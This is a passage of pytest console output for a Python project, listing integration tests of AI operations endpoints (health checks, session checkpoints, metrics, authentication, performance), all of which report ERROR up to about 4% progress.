============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
collecting ... collected 592 items

tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_success ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_degraded_performance ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_error_handling ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_active_sessions_success ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_active_sessions_empty ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_create_session_checkpoint_success ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_create_session_checkpoint_error ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_restore_session_checkpoint_success ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_restore_session_checkpoint_error ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_success ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_default_expiry ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_error ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_ai_metrics_summary_success ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_ai_metrics_summary_error ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_rate_limiting ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_health_check_without_auth ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_active_sessions_without_auth ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_checkpoint_creation_without_auth ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_metrics_summary_without_auth ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndToEnd::test_session_management_workflow ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndToEnd::test_health_monitoring_workflow ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_health_check_response_time ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_metrics_summary_response_time ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_concurrent_requests_handling ERROR [  4%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_session_operations_performance ERROR [  4%]
